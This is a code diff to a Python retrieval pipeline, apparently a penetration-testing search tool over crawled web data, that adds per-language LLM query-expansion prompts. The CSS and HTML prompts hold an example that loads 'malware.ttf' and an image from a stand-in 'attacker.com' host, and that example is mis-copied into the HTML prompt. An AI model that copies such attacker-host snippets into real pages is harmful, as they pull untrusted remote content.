@@ -47,6 +47,8 @@ os.environ['HAYSTACK_TELEMETRY_DISABLED'] = "1"
 
 logger = logging.getLogger(__name__)
 
+# Change this when previously indexed data becomes obsolete
+WEB_RESOURCE_VERSION = 1
 
 async def create_chroma_client(db: str) -> AsyncClientAPI:
     if re.match(r'\S+:\d+$', db):
@@ -122,28 +124,118 @@ class Query:
         return {"text": text, "filters": filters or {}, "max_results": max_results}
 
 
+query_expander_natural_language = """
+You are a cybersecurity search assistant that processes users queries.
+You expand a given query into at most {{ number }} queries that are similar in meaning. The expanded query should not be less specific. All URLs or IP addresses that appear in the original query must be included in the expanded query.
+
+Structure:
+Output the expanded queries as a valid JSON list of strings. Only output the list. Do not include any other text except the JSON list of expanded queries.
+Examples:
+1. Example Query 1: "cross-site scripting mitigation"  
+   Example Expanded Queries: ["XSS prevention techniques", "sanitizing user input", "reflected XSS protection", "stored XSS defense"]
+
+2. Example Query 2: "SQL injection exploitation"  
+   Example Expanded Queries: ["union-based SQL injection", "blind SQLi attack", "SQLMap usage examples", "database extraction via SQLi"]          
+Your Task:
+Query: "{{query}}"
+Example Expanded Queries:
+"""
+
+query_expander_javascript = """
+You are a cybersecurity search assistant that processes users queries. You are specialized in JavaScript
+programming, securing coding in JavaScript, and obfuscation techniques.
+You expand a given query into at most {{ number }} queries that are example JavaScript snippets that are an interpretation of the given query. Never include console.log(). Do not include the target hostname or IP address.
+
+Structure:
+Output the expanded queries as a valid JSON list of strings. Only output the list. The values must only be JavaScript code. Do not include any other text except the JSON list of expanded queries. Exclude expanded queries that are only whitespace.
+
+Examples:
+1. Example Query 1: "What javascript libraries call eval()"
+   Example Expanded Queries: ["Object.prototype.eval = function() {\n return eval(this);\n};", "window.eval = function(code) {\n return eval(code);\n};", "Function.prototype.customEval = function(code) {\n return eval(code);\n}"]
+1. Example Query 1: "Find Javascript libraries on http://2million.htb"
+   Example Expanded Queries: ["fetch('/libraries').then(res => res.json()).then(data => data.map(lib => lib.name))","axios.get('/libraries').then(response => response.data.map(lib => lib.name))","new XMLHttpRequest().open('GET', '/libraries', true).send(), new Promise((resolve) => { resolve(xhr.responseXML.getElementsByTagName('library').textContent.split(', ')); })","$.ajax({url: '/libraries', success: function(data){ $.each($(data).find('.library'), function(index, lib){ console.log($(lib).text()); }); }})","fetch('/libraries').then(res => res.text()).then(html => Array.from(new DOMParser().parseFromString(html, 'text/html').getElementsByTagName('a')).map(a => a.textContent))"]
+
+Your Task:
+Query: "{{query}}"
+Example Expanded Queries:
+"""
+
+query_expander_css = """
+You are a cybersecurity search assistant that processes users queries. You are specialized in style sheet
+development and securing CSS.
+You expand a given query into at most {{ number }} queries that are example CSS snippets that are an interpretation of the given query. Do not include the target hostname or IP address.
+
+Structure:
+Output the expanded queries as a valid JSON list of strings. Only output the list. The values must only be CSS code. Do not include any other text except the JSON list of expanded queries. Exclude expanded queries that are only whitespace.
+
+Examples:
+1. Example Query 1: "Find CSS vulns"
+   Example Expanded Queries: ["x-allow-cross-origin-resource-sharing: *;\n@font-face { src: url(‘http://attacker.com/malware.ttf’); }\ninput[type=‘text’] { content: url(‘http://attacker.com/hack.jpg’); }"]
+
+Your Task:
+Query: "{{query}}"
+Example Expanded Queries:
+"""
+
+query_expander_html = """
+You are a cybersecurity search assistant that processes users queries. You are specialized in HTML
+development and securing HTML.
+You expand a given query into at most {{ number }} queries that are example HTML snippets that are an interpretation of the given query. Do not include the target hostname or IP address.
+
+Structure:
+Output the expanded queries as a valid JSON list of strings. Only output the list. The values must only be HTML code. Do not include any other text except the JSON list of expanded queries. Exclude expanded queries that are only whitespace.
+
+Examples:
+1. Example Query 1: "Find CSS vulns"
+   Example Expanded Queries: ["x-allow-cross-origin-resource-sharing: *;\n@font-face { src: url(‘http://attacker.com/malware.ttf’); }\ninput[type=‘text’] { content: url(‘http://attacker.com/hack.jpg’); }"]
+
+Your Task:
+Query: "{{query}}"
+Example Expanded Queries:
+"""
+
+query_expander_xml = """
+You are a cybersecurity search assistant that processes users queries. You are specialized in XML
+development and securing XML.
+You expand a given query into at most {{ number }} queries that are example XML snippets that are an interpretation of the given query.
+
+Structure:
+Output the expanded queries as a valid JSON list of strings. Only output the list. The values must only be XML code. Do not include any other text except the JSON list of expanded queries. Exclude expanded queries that are only whitespace.
+
+Examples:
+1. Example Query 1: "Find <docs>...</docs>"
+   Example Expanded Queries: ["<docs>...</docs>"]
+
+Your Task:
+Query: "{{query}}"
+Example Expanded Queries:
+"""
+
+query_expander_network = """
+You are a cybersecurity search assistant that processes users queries. You are specialized in the security of the HTTP protocol and vulnerabilities associated with HTTP.
+You expand a given query into at most {{ number }} queries that are snippets of things in HTTP like headers and response codes.
+
+Structure:
+Output the expanded queries as a valid JSON list of strings. Only output the list. The values must only be XML code. Do not include any other text except the JSON list of expanded queries. Exclude expanded queries that are only whitespace.
+
+Examples:
+1. Example Query 1: "Examine the CSP"
+   Example Expanded Queries: ["Content-Security-Policy:"]
+2. Example Query 1: "Look for vulnerable cookie settings"
+   Example Expanded Queries: ["Set-Cookie: samesite=None", "Set-Cookie: domain="]
+
+Your Task:
+Query: "{{query}}"
+Example Expanded Queries:
+"""
+
 @component
 class QueryExpander:
     def __init__(self, generator_config: GeneratorConfig, prompt: Optional[str] = None):
 
         self.query_expansion_prompt = prompt
         if prompt is None:
-            self.query_expansion_prompt = """
-          You are a cybersecurity search assistant that processes users queries.
-          You expand a given query into at most {{ number }} queries that are similar in meaning. The expanded query should not be less specific. All URLs or IP addresses that appear in the original query must be included in the expanded query.
-          
-          Structure:
-          Output the expanded queries as a valid JSON list of strings. Only output the list. Do not include any other text except the JSON list of expanded queries.
-          Examples:
-            1. Example Query 1: "cross-site scripting mitigation"  
-               Example Expanded Queries: ["XSS prevention techniques", "sanitizing user input", "reflected XSS protection", "stored XSS defense"]
-            
-            2. Example Query 2: "SQL injection exploitation"  
-               Example Expanded Queries: ["union-based SQL injection", "blind SQLi attack", "SQLMap usage examples", "database extraction via SQLi"]          
-          Your Task:
-          Query: "{{query}}"
-          Example Expanded Queries:
-          """
+            self.query_expansion_prompt = query_expander_natural_language
         builder = PromptBuilder(self.query_expansion_prompt, required_variables=["number", "query"])
         llm = generator_config.create_generator()
         self.pipeline = Pipeline()
@@ -172,6 +264,7 @@ class QueryExpander:
                 expanded_list.extend(list(map(
                     lambda e: first(e.values()) if isinstance(e, dict) else str(e),
                     expanded_json)))
+            expanded_list = list(filter(bool, expanded_list))
             return {"queries": expanded_list}
         except JSONDecodeError:
             return {"queries": [query]}
@@ -351,7 +444,7 @@ async def build_document_pipeline(db: str, generator_config: GeneratorConfig) ->
     :param db: path to the database.
     :return: Pipeline
     """
-    collections = await list_collections(db)
+    collections = doc_type_to_model.keys()
 
     pipe = Pipeline()
     comb = CombineDocs([f"{col}_documents" for col in collections])
@@ -368,21 +461,37 @@ async def build_document_pipeline(db: str, generator_config: GeneratorConfig) ->
         model_name = get_model_for_doc_type(col)
         ret_name = f"ret_{col}"
 
-        embedder = SentenceTransformersTextEmbedder(model=model_name, progress_bar=False)
         store = create_chrome_document_store(db=db, collection_name=col)
+        stores[col] = store
+        embedder = SentenceTransformersTextEmbedder(model=model_name, progress_bar=False)
         retriever = ChromaEmbeddingRetriever(document_store=store)
         multiquery_retriever = MultiQueryChromaRetriever(embedder, retriever)
+        retrievers[col] = multiquery_retriever
 
         pipe.add_component(ret_name, multiquery_retriever)
 
+        custom_query_expander = None
+        if col == "javascript":
+            custom_query_expander = QueryExpander(generator_config, prompt=query_expander_javascript)
+        elif col == "css":
+            custom_query_expander = QueryExpander(generator_config, prompt=query_expander_css)
+        elif col == "html":
+            custom_query_expander = QueryExpander(generator_config, prompt=query_expander_html)
+        elif col == "xml":
+            custom_query_expander = QueryExpander(generator_config, prompt=query_expander_xml)
+        elif col == "network":
+            custom_query_expander = QueryExpander(generator_config, prompt=query_expander_network)
+
         # wiring: Query → embedder → retriever → combiner
         pipe.connect("query.max_results", ret_name + ".top_k")
-        pipe.connect("query_expander.queries", ret_name + ".queries")
+        if custom_query_expander is not None:
+            pipe.add_component("query_expander_"+col, custom_query_expander)
+            pipe.connect("query.text", "query_expander_"+col+".query")
+            pipe.connect("query_expander_"+col+".queries", ret_name + ".queries")
+        else:
+            pipe.connect("query_expander.queries", ret_name + ".queries")
         pipe.connect("query.filters", ret_name + ".filters")
         pipe.connect(ret_name + ".documents", f"combine.{col}_documents")
-
-        retrievers[col] = multiquery_retriever
-        stores[col] = store
 
     # pipe.add_component("trace_docs", TraceDocs())
     # pipe.connect("query.text", "trace_docs.query")
@@ -520,12 +629,7 @@ class KatanaDocument:
         timestamp = entry["timestamp"]  # 2025-06-28T22:52:07.882000
         timestamp_for_id = timestamp[0:11]  # one document per URL per day
         response_body: Optional[str] = entry.get("response", {}).get("body", None)
-        content = "\n".join(
-            list(filter(lambda x: x is not None, [
-                entry.get("request", {}).get("body", None),
-                response_body,
-            ]))
-        )
+        content = response_body
         status_code = entry["response"].get("status_code", 200)
         http_method = entry["request"].get("method", "").upper()
         request_headers = entry["request"].get("headers", {})
@@ -576,6 +680,7 @@ class KatanaDocument:
                     description = content.strip()
 
         base_meta = {
+            "version": WEB_RESOURCE_VERSION,
             "url": url,
             "netloc": netloc,
             "host": host,
